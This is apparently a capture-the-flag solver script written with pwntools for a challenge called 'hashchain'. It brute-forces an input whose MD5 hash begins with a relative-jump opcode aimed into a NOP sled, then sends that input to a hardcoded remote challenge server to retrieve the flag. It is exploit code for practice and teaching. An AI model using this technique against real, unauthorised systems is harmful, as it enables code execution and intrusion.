from pwn import * 
elf = ELF('./hashchain_patched')
import hashlib
import struct

def solve():
    sled_start = 0x41000000 #nop sled 
    sled_end = 0x41F00000 # sled end -> begining shellcode
    current_eip = 0x40000000
    
    i = 0
    while True:
        s = str(i).encode()
        h = hashlib.md5(s).digest()
        
        if h[0] == 0xe9:
            offset = struct.unpack('<i', h[1:5])[0]
            destination = current_eip + 5 + offset #0xe9 is the opcode of jump rel32 so jmp (eip + the 4 bytes packed) + the length of the instruction which is opcode and 4 bytes for addr :  Destination=(Current_EIP+Instruction_Length)+Offset
            
            if sled_start <= destination <= sled_end:
                print(s)
                return s
        
        i += 1

        
string = solve()
r = remote("52.59.124.14",5010)
r.recvuntil(b'>')
r.sendline(string)
r.recvuntil(b'>')
r.sendline('doit')
output = r.recvall().decode()
if "ENO{" in output: 
   print(output)
r.close()  


###nice challenge
